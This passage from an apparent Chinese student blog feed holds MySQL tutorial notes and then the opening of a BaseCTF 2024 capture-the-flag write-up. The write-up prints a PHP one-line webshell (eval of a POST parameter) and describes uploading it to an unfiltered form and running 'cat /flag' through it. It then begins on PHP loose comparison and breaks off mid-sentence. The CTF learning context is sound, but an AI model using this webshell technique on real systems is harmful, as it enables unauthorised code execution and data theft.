51);">长文本数据</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">mediumblob</font></td><td><font style="color:rgb(51, 51, 51);">0-16 777 215 bytes</font></td><td><font style="color:rgb(51, 51, 51);">二进制形式的中等长度文本数据</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">mediumtext</font></td><td><font style="color:rgb(51, 51, 51);">0-16 777 215 bytes</font></td><td><font style="color:rgb(51, 51, 51);">中等长度文本数据</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">longblob</font></td><td><font style="color:rgb(51, 51, 51);">0-4 294 967 295 bytes</font></td><td><font style="color:rgb(51, 51, 51);">二进制形式的极大文本数据</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">longtext</font></td><td><font style="color:rgb(51, 51, 51);">0-4 294 967 295 bytes</font></td><td><font style="color:rgb(51, 51, 51);">极大文本数据</font></td></tr></tbody></table><h2 id="2-创建表"><a href="#2-创建表" class="headerlink" title="2.创建表"></a>2.创建表</h2><p>在创建好数据库时，接下来的工作就是创建数据表。创建数据表是指在已经创建的数据库中建立新表。创建数据表的过程是规定数据列的属性的过程，同时也是实施数据的完整性（包括实体完整性、引用完整性和域完整性)约束的过程。</p><p>在创建数据表之前需要说明在那个数据库进行操作，语句为：</p><p><em><strong><font style="color:#601BDE;">use </font></strong></em> <em><strong>数据库名</strong></em> <em><strong><font style="color:#601BDE;"> ;</font></strong></em></p><p>使用语句创建数据表的语法结构为：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732246427942-163740d5-17b5-4ac5-83fc-bf8d454f6f55.png"></p><p>创建表的语句为create table，语法规则如下：</p><p><em><strong><font style="color:#601BDE;">create table </font></strong></em> <em><strong>表名</strong></em></p><p><em><strong><font style="color:#601BDE;">(</font></strong></em></p><p><em><strong>字段名1，数据类型[列级别约束条件] [默认值]，</strong></em></p><p><em><strong>字段名1，数据类型[列级别约束条件] [默认值]，</strong></em></p><p><em><strong>……</strong></em></p><p><em><strong>[表级别约束条件]</strong></em></p><p><em><strong><font style="color:#601BDE;">）;</font></strong></em></p><p>示例：创建一个employees表包含雇员ID，雇员名字，雇员薪水：</p><p>先创建一个数据库text，并选中</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732260744459-e940120d-352d-41d7-957c-e2c982cf557c.png"></p><p>之后创建雇员数据表</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732260779548-77959b9d-4a40-48ed-b75c-2c4c58869402.png"></p><p> “employee_id int,“代表雇员名字，数据类型是int；</p><p>”employee_name varchar(10),”代表雇员名字，数据类型是varchar，字符不超过10个；  </p><p> “salary float(8,2),“代表雇员的薪水，数据类型是float，该数据一共有8位，6位整数，2位小数。</p><p>这样一个数据表就创建成功了。</p><p>查看已创建的表的语句是：</p><p><em><strong><font style="color:#601BDE;">show tables;</font></strong></em></p><p>输入后就可以查看创建的employees的表前提得选中，不然会报错</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732363697280-9554df66-16d5-4059-9ef3-1136cde9625e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732261198341-d9407d6f-fac6-4e49-a44d-6d34ee281472.png"></p><h2 id="3-删除表"><a href="#3-删除表" class="headerlink" title="3.删除表"></a>3.删除表</h2><p>如果想要删除表，对应语句为：</p><p><em><strong><font style="color:#601BDE;">drop table </font></strong><strong><strong>表格名</strong></strong><strong><font style="color:#601BDE;">；</font></strong></em></p><p>示例：删除刚才创建的employees表：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732261618978-3439ce11-cafa-4dff-88f9-ac49e062ab4a.png"></p><p>这时再查看表格时发现数据库已经是空的了,表明已经删除成功了：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732261663619-1651eb3c-ddfa-45cc-a5c3-77147a63ca36.png"></p><h2 id="4-修改表"><a href="#4-修改表" class="headerlink" title="4.修改表"></a>4.修改表</h2><h3 id="1-修改表-修改表名"><a href="#1-修改表-修改表名" class="headerlink" title="(1) 修改表_修改表名"></a>(1) 修改表_修改表名</h3><p>修改数据表的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>旧表名</strong></strong><strong><font style="color:#601BDE;"> rename </font></strong><strong><strong>新表名</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em></p><p>示例：创建一个employees表包含雇员ID，雇员名字，雇员薪水，并修改表名称为emp：</p><p>选中text数据库并创建employees表</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732276874849-8667c2dd-4dd3-4c78-8fb7-af10e89edab5.png"></p><p>此时查看表格，表格名是employees</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732276874731-58bf3d61-e6d5-4dff-a35a-b4bc8a683380.png"></p><p>输入语句“alter table employees rename emp;”改动表格名字</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732276874582-1d63f34c-cc85-4da4-841d-17bf9ce192b4.png"></p><p>再次查看表格，发现名字变为emp，说明表格名字改动成功</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732276874573-3805a730-1e2b-46d0-b8e7-1956993e4733.png"></p><h3 id="2-修改表-修改列名"><a href="#2-修改表-修改列名" class="headerlink" title="(2) 修改表_修改列名"></a>(2) 修改表_修改列名</h3><p>修改列名的语句是：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> change column</font></strong><strong><strong>旧列名 新列名 类型</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em></p><p>示例：将emp表中的employee_name修改为name：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732278857379-c17ad910-4cb9-4305-a04f-4ab265920731.png"></p><h3 id="3-修改表-修改列类型"><a href="#3-修改表-修改列类型" class="headerlink" title="(3) 修改表_修改列类型"></a>(3) 修改表_修改列类型</h3><p>修改列类型的语句是：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> modify </font></strong><strong><strong>列名 新类型</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em><font style="color:#601BDE;"></font></p><p><font style="color:#000000;">示例：将emp中的name的长度指定为40。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732279209652-6803d374-f09f-4e5f-bd88-947f4feb4e67.png"></p><h3 id="4-修改表-添加新列"><a href="#4-修改表-添加新列" class="headerlink" title="(4) 修改表_添加新列"></a>(4) 修改表_添加新列</h3><p>添加新列的语句是：<br><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> add column </font></strong><strong><strong>新列名 类型</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em></p><p>示例：在emp表中添加佣金列，列名为commission_pct</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732279664143-4d9187a1-fcfa-446a-bf28-2d7e30d78201.png"></p><h3 id="5-修改表-删除指定列"><a href="#5-修改表-删除指定列" class="headerlink" title="(5) 修改表_删除指定列"></a>(5) 修改表_删除指定列</h3><p>删除列的语句是：<br><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> drop column </font></strong><strong><strong>列名</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em></p><p>示例：在emp表中删除commission_pct列</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732280408279-a95e6c03-8dbf-450d-aadf-8f2a9cd371f4.png"></p><h2 id="5-MySQL的约束"><a href="#5-MySQL的约束" class="headerlink" title="5.MySQL的约束"></a><font style="color:#000000;">5.MySQL的约束</font></h2><h3 id="1-约束概述"><a href="#1-约束概述" class="headerlink" title="(1) 约束概述"></a><font style="color:#000000;">(1) 约束概述</font></h3><p>数据库约束是对表中的数据进行进一步的限制，确保数据的正确性、有效性和完整性。数据库的约束类型有：主键约束、外键约束、唯一性约束、非空约束和检查约束。</p><p>主键约束（Primary Key)：主键约束是使用最频繁的约束。它不允许为空、重复，以此保证数据的唯一性。在设计数据表时一般情况下，都会要求表中设置一个主键。主键是表的一个特殊字段，该字段能唯一标识该表中的每条信息。如果发现有重复值出现时，那么数据将无法添加到数据表当中。例如：学生信息表当中的学号是唯一的，这时就需要添加主键来进行约束。</p><p>外键约束(Foreign Key):<font style="color:rgb(77, 77, 77);">外键约束经常和主键约束一起使用，用来确保数据的一致性，用于限制两个表的关系，用于保证该字段的值必须来自于主表的关联列的值。它允许有空值、重复但是值必须是参照表中参照列中的所包含的值以保证数据的参照完整性。从表添加外键约束，用于引用主表中某列的值。比如学生表的专业编号，员工表的部门编号，员工表的工种编号。</font></p><p><font style="color:rgb(77, 77, 77);">唯一性约束（Unique)：用于约束该字段的值具有唯一性，可以有多个，可以没有，可以为空，允许为多个列添加唯一性约束，但是相同值只能出现一次。比如座位号</font></p><p><font style="color:rgb(77, 77, 77);">非空约束（Not Null):用于约束该字段的值不能为空,允许有空值，允许为多个列添加非空约束，保证了数据没有空值。比如姓名、学号等。</font></p><p><font style="color:rgb(77, 77, 77);">检查约束（Check)：检查约束也叫用户自定义约束，是用来检查数据表中，字段值是否有效的一个手段。</font></p><p><font style="color:rgb(77, 77, 77);">查询表中的约束信息的语句为：</font></p><p><em><strong><font style="color:#601BDE;">show keys from</font></strong><strong><strong><font style="color:rgb(77, 77, 77);"> 表名</font></strong></strong><strong><font style="color:#D22D8D;">；</font></strong></em></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732434747673-be973269-afed-454a-b724-a733cf8ca018.png"></p><h3 id="2-添加主键约束"><a href="#2-添加主键约束" class="headerlink" title="(2) 添加主键约束"></a><font style="color:#000000;">(2) 添加主键约束</font></h3><p>单一主键：使用一个列作为主键列，当列的值有重复时，则违反唯一约束。</p><p>联合主键：使用多个列作为主键列，当多个列的值都相同时，则违反唯一约束。</p><p>一般来说单一主键用的比较多</p><p>添加主键约束的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> add primary key (</font></strong><strong><strong>列名</strong></strong><strong><font style="color:#601BDE;">);</font></strong></em></p><p>示例：将emp表中的employee_id修改为主键。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732283270049-1fd226ea-2673-4fac-99eb-ee6328e8fe1a.png"></p><p><strong><font style="color:#000000;">主键自增长：</font></strong></p><p>MySQL中的自动增长要求：</p><ul><li>一个表中只能有一个列自动增长。</li><li>自动增长的类型必须是整形。</li><li>自动增长只能添加到具备主键约束与唯一性约束的列上。</li><li>删除主键约束或唯一性约束，如果该列拥有自动增长能力，则需要先去掉自动增长然后再删除约束。</li></ul><p>语句为：<br><em><strong><font style="color:#601BDE;"> alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> modify </font></strong><strong><strong>添加主键的列名 类型</strong></strong><strong><font style="color:#601BDE;"> auto_increment;</font></strong></em></p><p>示例：将emp表的employees_id修改为自增：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732364711171-6b93c5f4-d82b-4de4-b312-d5a90f98f04a.png"></p><h3 id="3-删除主键约束"><a href="#3-删除主键约束" class="headerlink" title="(3) 删除主键约束"></a><font style="color:#000000;">(3) 删除主键约束</font></h3><p>删除主键的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> drop primary key;</font></strong></em></p><p>删除主键时，如果主键具备自动增长能力，要先去掉自动增长，然后删除主键。</p><p>去掉主键自动增长的语句是：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> modify </font></strong><strong><strong>添加主键的列名 类型</strong></strong><strong><font style="color:#601BDE;"> ;</font></strong></em></p><p>示例：删除emp表中的employee_id主键约束</p><p>如果先输入删除主键的语句，则会报错</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732377063443-edcc9fa9-eef0-48ef-b58f-cd0781092a68.png"></p><p>因为employee_id有自动增长，所以会报错，要先去掉自动增长</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732377180774-1f01305b-6602-4cf3-984c-d179f8409bc9.png"></p><p>再删除主键约束</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732377213294-310cc4fa-18e1-4ac9-9b88-9caf5ded1c54.png"></p><h3 id="4-添加外键约束"><a href="#4-添加外键约束" class="headerlink" title="(4) 添加外键约束"></a><font style="color:#000000;">(4) 添加外键约束</font></h3><p>添加外键约束的语句为：</p><p><em><strong><font style="color:#601BDE;"> alter tables </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> add constraint </font></strong><strong><strong>约束名</strong></strong><strong><font style="color:#601BDE;"> foreign key (</font></strong><strong><strong>列名</strong></strong><strong><font style="color:#601BDE;">) references </font></strong><strong><strong>参照的表名</strong></strong><strong><font style="color:#601BDE;">(</font></strong><strong><strong>参照的列名</strong></strong><strong><font style="color:#601BDE;">);</font></strong></em></p><p><font style="color:#000000;">示例：创建depaartments表包含department_id,department_name,location_id。</font></p><p><font style="color:#000000;">并修改depaartments表，向department_id列添加主键约束与自动递增：</font></p><p><font style="color:#000000;">创建depaartments表</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732379841036-a95018f7-fadf-4658-9153-215d1b48ac70.png"></p><p>添加主键约束</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732379876215-d8e3267d-703e-4c51-8545-3080d89ba65f.png"></p><p>添加<font style="color:#000000;">自动递增</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732380008614-d4995595-a719-4722-846c-8e5af6907f5e.png"></p><p>修改emp表，添加dept_id列</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732380153379-11f0c388-d9f2-4455-8b4d-124135097ce7.png"></p><p>向dept_id列添加外键约束</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732382236126-346fde09-f5e1-4839-a6c9-a835682d80be.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732382157825-af4c992d-a598-4165-beb2-5135bc9b6701.png"></p><p>不知道为什么会报错，给 dept_id加上主键自动增长改成一样的格式也是同样样报错</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732432771202-050c4a80-4a2e-423f-844a-fe21be570c51.png"></p><p>最后查了资料是在emp后面加上“_fk“组成约束名来”解决的</p><h3 id="5-删除外键约束"><a href="#5-删除外键约束" class="headerlink" title="(5) 删除外键约束"></a>(5) 删除外键约束</h3><p>删除外键约束的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> drop foreign key </font></strong><strong><strong>约束名</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em></p><p>示例：删除dept_id的外键约束。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732433413214-86d64c13-0ac0-417c-b149-d0e92f0329fa.png"></p><h3 id="6-添加唯一性约束"><a href="#6-添加唯一性约束" class="headerlink" title="(6) 添加唯一性约束"></a>(6) 添加唯一性约束</h3><p>添加唯一性约束的语句是：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> add constraint </font></strong><strong><strong>约束名</strong></strong><strong><font style="color:#601BDE;"> unique(</font></strong><strong><strong>列名</strong></strong><strong><font style="color:#601BDE;">);</font></strong></em></p><p>示例：向emp表中的name添加唯一性约束。</p><p> <img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732433691067-73a56022-a439-4634-a70b-a0932c94984b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732434292270-e9dc08f5-48ea-4b62-93ba-7ffbd8c0979f.png"></p><h3 id="7-删除唯一性约束"><a href="#7-删除唯一性约束" class="headerlink" title="(7) 删除唯一性约束"></a>(7) 删除唯一性约束</h3><p>删除唯一性约束的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> drop key </font></strong><strong><strong>约束名</strong></strong><strong><font style="color:#601BDE;">;</font></strong></em></p><p>示例：删除name的唯一性约束。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732433860926-af01a128-970c-492f-b634-ee7ff2fc0d1f.png"></p><h3 id="8-添加非空约束"><a href="#8-添加非空约束" class="headerlink" title="(8) 添加非空约束"></a>(8) 添加非空约束</h3><p>添加非空约束的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> modify </font></strong><strong><strong>列名 类型</strong></strong><strong><font style="color:#601BDE;"> not null;</font></strong></em></p><p>示例：向emp表中的salary添加非空约束：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732434145776-484479dd-f51a-48c0-8ecc-e697b03f23bc.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732434243632-933fab18-8d41-4c34-b881-384db2167e0d.png"></p><h3 id="9-删除非空约束"><a href="#9-删除非空约束" class="headerlink" title="(9) 删除非空约束"></a>(9) 删除非空约束</h3><p>删除非空约束的语句为：</p><p><em><strong><font style="color:#601BDE;">alter table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;"> modify </font></strong><strong><strong>列名 类型</strong></strong><strong><font style="color:#601BDE;"> null ;</font></strong></em></p><p>示例：删除emp表中salary的非空约束</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732434378778-bd19a88c-0949-4cd3-acad-d12d48717a7e.png"></p><h3 id="10-创建表时添加约束"><a href="#10-创建表时添加约束" class="headerlink" title="(10) 创建表时添加约束"></a>(10) 创建表时添加约束</h3><p>一般来说除了外键约束不能在创建表时创建，其他约束均能在创建表时创建，创建时在列类型的后面加上约束类型即可。</p><p>示例：创建depts表包含department_id该列为主键且为自动增长，<font style="color:#000000;">department_name列不允许重复，location_id列不含有空值。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732435428151-d1ff4d7a-6362-4a1e-b0db-2c9f1331613f.png"></p><h2 id="6-数据处理"><a href="#6-数据处理" class="headerlink" title="6.数据处理"></a>6.数据处理</h2><h3 id="1-添加数据"><a href="#1-添加数据" class="headerlink" title="(1) 添加数据"></a>(1) 添加数据</h3><p>选择插入的语句为：</p><p><em><strong><font style="color:#601BDE;">insert into </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;">(</font></strong><strong><strong>列名1</strong></strong><strong><font style="color:#601BDE;">，</font></strong><strong><strong>列名2</strong></strong><strong><font style="color:#601BDE;">，……)values(</font></strong><strong><strong>值1，值2</strong></strong><strong><font style="color:#601BDE;">……);</font></strong></em></p><p>注意有非空约束的一定要有数据；</p><p>示例：向departments 表中添加一条数据，部门名称为market,工作地点ID为1</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732435902720-c8208610-4631-434d-b770-30043c6882bb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732436078740-18c97665-b6fc-446f-956a-a534f7822580.png"></p><h3 id="2-默认值处理"><a href="#2-默认值处理" class="headerlink" title="(2) 默认值处理"></a>(2) 默认值处理</h3><p>如果插入数据时未指定该列的值，则我们可以设置默认值</p><p>创建表时指定某列默认值的语句是：</p><p><em><strong><font style="color:#601BDE;">create table </font></strong><strong><strong>表名</strong></strong><strong><font style="color:#601BDE;">(</font></strong><strong><strong>列名 类型</strong></strong><strong><font style="color:#601BDE;">default </font></strong><strong><strong>默认值</strong></strong><strong><font style="color:#601BDE;">，……);</font></strong></em></p><p>示例：创建emp3表，该表包含emp_id主键且自动增长，包含name，包含address且该列默认值为”Unknown”</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732436680329-b1ab360a-7e6c-447f-87f2-edd5fbfc795c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732436753845-e4b1a20c-afbb-45fe-aee0-b10392e893a6.png"></p><p>修改表添加新列并指定默认值的语句为：</p><p>alter table 表名 add column 列名 类型 default 默认值;</p><p>示例：修改emp3表，添加job_id列且该列的默认值为0</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732437150417-d1f088ea-df47-4d05-b9ad-f36aa6667d02.png"></p><p>插入数据时的默认值处理</p><p>如果在插入数据时未指定该列的值，那么MySQL会将默认值添加到该列如果是完全项插入需要使用default来占位。</p><p>示例：向emp3插入数据，要求address列与job_id列使用默认值作为该列的值。</p><p>两种方式：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732438164271-b66f6865-20c5-4294-b893-499050baf5ca.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732438341948-e902041d-ee06-4dcf-96ad-faa4e3c200ef.png"></p><h3 id="3-更新数据"><a href="#3-更新数据" class="headerlink" title="(3) 更新数据"></a>(3) 更新数据</h3><p>更新数据时一定要给定更新条件，否则表中所有数据都会更新</p><p>更新数据的语句为：</p><p>update 表名 set 列名&#x3D;值，列名&#x3D;值  where 条件;</p><p>示例：更新emp3表中的id为1的数据，添加address为北京</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732438697500-bee908dd-2bc4-484e-a09e-9917cd13baae.png"></p><h3 id="4-删除数据"><a href="#4-删除数据" class="headerlink" title="(4) 删除数据"></a>(4) 删除数据</h3><p>删除数据一定要给定删除条件，否则所有数据都会删除</p><p>删除数据的语句为：</p><p>delate from 表名 where 条件;</p><p>示例：删emp3表中的emp_id为1的雇员信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732439401475-2730ad24-ef08-46cf-ae64-9e25cbeb4b27.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732439420775-4cdcda4b-5290-4ece-ac91-fbcf53114b66.png"></p><h2 id="7-查询"><a href="#7-查询" class="headerlink" title="7.查询"></a>7.查询</h2><h3 id="1-select基本查询介绍"><a href="#1-select基本查询介绍" class="headerlink" title="(1) select基本查询介绍"></a>(1) select基本查询介绍</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732439467176-44284ad7-4f11-4d50-b80a-719a90fc3242.png"></p><p>SELECT语句从数据库中返回信息。使用一个SELECT语句，可以做下面事情：</p><p><strong>列选择</strong>：能够使用SELECT语句的列选择功能选择表中的列，这些列是想要用查询返回的。当查询时，能够返回列中的数据。</p><p><strong>行选择</strong>：能够使用SELECT语句的行选择功能选择表中的行，这些行是想要用查询返回的。能够用不同的标准限制看见的行。</p><p><strong>链接</strong>：能够使用SELECT语句的连接功能来集合数据，这些数据被存储在不同的表中，在它们之间可以创建连接，查询出我们关心的数据</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732440117182-ba1ca5f6-8b9a-4ab4-af91-f80c2b6c3756.png"> <strong>基本SELECT语句</strong></p><p>在最简单的形式中，select语句必须包含一下内容：</p><p>一个select子句，指定被显示的列</p><p>一个from子句，指定表，该表包含select子句中的字段列表</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732440274696-4ecb19d0-3d26-4f46-b99b-5d97a2ffb781.png"></p><h3 id="2-查询中的列选择"><a href="#2-查询中的列选择" class="headerlink" title="(2) 查询中的列选择"></a>(2) 查询中的列选择</h3><p>选择所有列的语句为：</p><p>select * from  表名;</p><p>用跟在select关键字后面的星号(*)，你能够显示表中所有数据的所有列。</p><p>示例：查询departments表中的所有数据。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732440616777-78ed42c5-ea58-4ec7-87c0-5c862ce37a0b.png"></p><p>选择指定的列的语句为：</p><p>select 列名1，列名2…… from 表名;</p><p>示例：查询departments表中的所有部门名称</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732440781231-60e71a82-6d58-4577-99ca-98d3ce29afbf.png"></p><h3 id="3-查询中的算数表达式"><a href="#3-查询中的算数表达式" class="headerlink" title="(3) 查询中的算数表达式"></a>(3) 查询中的算数表达式</h3><p>算数表达式有：加(+)、减(-)、乘(*)和除(&#x2F;)</p><p>需要修改数据的显示方式，如执行计算，或者作假定推测，这些都可能用到算数表达式。一个算数表达式可以包含列名、固定的数字值和算数运算符。</p><p>在查询到的结果做算数表达式处理时，并不会影响我们表中的数据，并不会更新到我们表当中去</p><p>做算术表达式，使用算数运算符的语句为：</p><p>select 列名1，列名2 关于列名2的算数表达式 from 表名;</p><p>示例：查询雇员的年薪。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732442718455-308103f0-4167-4ab0-9f53-db4daf7c1e90.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732442718436-d10b493a-2936-47e3-acc7-2b447ff2c113.png"></p><p>这周先写到这里吧，这周确实挺累的，有很多课结课了，作业一堆， 事情也挺多的。</p><p>心有所向，日复一日，必有精进！加油！</p>]]></content>
      
      
      <categories>
          
          <category> HelloWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Knowledge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024新生赛复现</title>
      <link href="/2024/11/15/HelloWeb/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/11/15/HelloWeb/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>本次复现题目为：upload、md5绕过欸、Aura 酱的礼物<p>复现这些题目时我是跟着这个视频一步一步来的:</p><p><u><font style="color:rgb(0,0,255);"></font></u><a href="https://www.bilibili.com/video/BV19wWEeoE1o/?share_source=copy_web&vd_source=26a21a8ac3f19fd0d663fb58dee41081"><u>https://www.bilibili.com/video/BV19wWEeoE1o/share_source&#x3D;copy_web&amp;vd_source&#x3D;26a21a8ac3f19fd0d663fb58dee41081</u></a></p><h1 id="一、upload"><a href="#一、upload" class="headerlink" title="一、upload"></a>一、upload</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731851710813-826e7242-c871-4115-9469-bb417e479693.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731851710890-95965788-2a59-466e-a96d-06c26625475a.png"></p><p>upload是一个无过滤的一种文件上传,解这道题需要一句话木马  <strong>&lt;?php eval($_POST[0]);</strong></p><p>意思是直接把POST的参数里的0传到eval函数里面。</p><p><strong>&lt;?php</strong>表示这是个文件的开头,说明后面的所有内容都是PHP的代码。</p><p><strong>eval()</strong> 函数表示要动态执行。</p><p><strong>POST</strong> 是获取到一些POST的信息。</p><p><strong>0</strong> 表示要获取POST参数的0参数传到eval()函数里面。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731851850359-7a75a2e7-1026-4dad-a99a-64b1a8b0adac.png"></p><p>之后直接上传一句话木马,可以看到它后端的逻辑,就是把所有的文件移动到upload文件夹下面,然后获取它原本的文件名,之后把他拼接起来,把我们的文件给他放在那。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731852459201-9e0ac43b-e6e8-4145-8830-fb05ea59fd2b.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731852460704-dae9dc09-3ebd-4c8c-bd94-8a0689658485.png"></p><p>所以我们刚刚上传的文件就在upload的文件名eval这里,访问它就是空白页面</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731852923679-1eb587a8-11cd-41d1-a387-dcd8729d703c.png"></p><p>之后打开HackBar,手动用system构造eval,然后单引号里输入cat &#x2F;flag,再传递就行了,得到flag提交。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731853038676-f1b1ed4b-fac4-4dc9-9948-1fe2f14afdca.png"></p><h1 id="二、md5绕过欸"><a href="#二、md5绕过欸" class="headerlink" title="二、md5绕过欸"></a>二、md5绕过欸</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732346205513-226477c0-4973-4d43-9e1b-2824847485a8.png"></p><p>进去后发现这一串代码：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732346244928-0994455a-981e-458f-a03f-c98d0a444738.png"></p><p>该题目考的是php弱比较</p><p>关于php弱比较：</p><p>php是一种弱类型语言,对数据的类型要求并不严格,可以让数据类型互相转换。</p><p>在php中有两种比较符号: 一种是 &#x3D;&#x3D;,另外一种是 &#x3D;&#x3D;&#x3D;,都是用来比较两个数值是否相等的操作符,但他们也是有区别的:</p><p>&#x3D;&#x3D; ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说,它不会比较变量类型,只比较值。至于怎么转换后续会再赘述。</p><p>&#x3D;&#x3D;&#x3D; ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较,如果类型不同直接返回不相等。既比较值也比较类型。</p><p>当要比较的两种字符串的类型相同时,&#x3D;&#x3D; 和 &#x3D;&#x3D;&#x3D; 